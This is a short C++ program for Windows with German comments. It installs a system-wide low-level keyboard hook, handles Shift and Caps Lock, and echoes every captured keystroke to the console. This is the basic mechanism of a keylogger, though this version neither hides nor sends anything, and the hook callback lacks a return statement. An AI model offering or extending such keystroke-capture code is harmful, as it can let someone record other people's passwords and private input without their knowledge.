#include <iostream>
#include <windows.h>
using namespace std;

#define C_CAPS_LOCK  20
#define C_SHIFT     -96
#define C_RETURN     13
#define C_AE        -34
#define C_OE        -64
#define C_UE        -70

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT hook = (PKBDLLHOOKSTRUCT)lParam;

    if(wParam == WM_KEYDOWN)
    {
        if(hook->vkCode)
        {
            // Falls Zeichen nicht sichtbar sein soll
            bool noprint = false;

            // Groß- und Kleinschreibung (CAPS LOCK, SHIFT) behandeln
            char key = (char)hook->vkCode;
            if(GetKeyState(VK_CAPITAL) || GetAsyncKeyState(VK_SHIFT))   // bei GetKeyState(VK_SHIFT)
                key = toupper(key);                                     // hat es nicht richtig
            else                                                        // funktioniert
                key = tolower(key);

            // beim Drücken von CAPS LOCK kein Zeichen (key) ausgeben
            if(key == C_CAPS_LOCK || key == C_SHIFT)
                noprint = true;

//            // bei Enter-Taste eine neue Zeile anfangen
//            if(key == C_RETURN) key = '\n';


            if(!noprint)
            cout << key;
        }
    }

    CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);

    MSG messages;
    while (GetMessage(&messages, NULL, 0, 0))
    {
    }



    return 0;
}
